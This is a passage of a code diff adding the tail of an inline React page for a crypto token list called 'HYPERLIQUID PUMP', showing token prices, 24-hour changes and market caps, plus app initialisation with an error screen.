+                  key={`${token.symbol}-${index}`}
+                  onClick={() => handleTokenClick(token)}
+                  className="bg-gray-800 hover:bg-gray-700 cursor-pointer transition-colors p-4 rounded-lg"
+                >
+                  <div className="flex items-center justify-between">
+                    <div className="flex items-center gap-3">
+                      <img 
+                        src={token.logo} 
+                        alt={token.symbol} 
+                        className="w-12 h-12 rounded-full"
+                        onError={(e) => {
+                          e.target.src = `https://via.placeholder.com/48/10B981/ffffff?text=${token.symbol}`;
+                        }}
+                      />
+                      <div>
+                        <div className="font-bold text-white">{token.symbol}</div>
+                        <div className="text-sm text-gray-400">{token.name}</div>
+                      </div>
+                    </div>
+                    
+                    <div className="text-right">
+                      <div className="font-mono text-green-400 font-bold">
+                        ${parseFloat(token.price).toFixed(6)}
+                      </div>
+                      <div className={`text-sm ${token.priceChange24h >= 0 ? 'text-green-400' : 'text-red-400'}`}>
+                        {token.priceChange24h >= 0 ? '+' : ''}{token.priceChange24h?.toFixed(2) || '0.00'}%
+                      </div>
+                      <div className="text-xs text-gray-400">
+                        {token.marketCap >= 1e9 ? 
+                          `$${(token.marketCap / 1e9).toFixed(1)}B` : 
+                          `$${(token.marketCap / 1e6).toFixed(1)}M`
+                        } MCAP
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              ))}
+            </div>
+          </main>
+        </div>
+      );
+    }
+    
+    // Initialize the app
+    function initApp() {
+      try {
+        console.log('🚀 Initializing HYPERLIQUID PUMP...');
+        const container = document.getElementById('root');
+        const root = ReactDOM.createRoot ? ReactDOM.createRoot(container) : null;
+        
+        if (root) {
+          root.render(React.createElement(App));
+        } else {
+          ReactDOM.render(React.createElement(App), container);
+        }
+        
+        console.log('✅ App initialized successfully');
+      } catch (error) {
+        console.error('❌ Failed to initialize app:', error);
+        document.getElementById('root').innerHTML = `
+          <div style="padding: 40px; text-align: center; color: white; background: #1F2937; min-height: 100vh;">
+            <h1 style="color: #EF4444; margin-bottom: 20px;">Application Error</h1>
+            <div style="color: #9CA3AF; margin-bottom: 20px;">Failed to load HYPERLIQUID PUMP</div>
+            <pre style="background: #374151; padding: 20px; border-radius: 8px; text-align: left; font-size: 12px; color: #E5E7EB; white-space: pre-wrap;">${error.toString()}</pre>
+            <button onclick="location.reload()" style="margin-top: 20px; padding: 10px 20px; background: #10B981; border: none; color: white; border-radius: 6px; cursor: pointer;">Reload Page</button>
+          </div>
+        `;
+      }
+    }
+    
+    // Start when DOM is ready
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', initApp);
+    } else {
+      initApp();
+    }
+  </script>
+</body>
+</html>
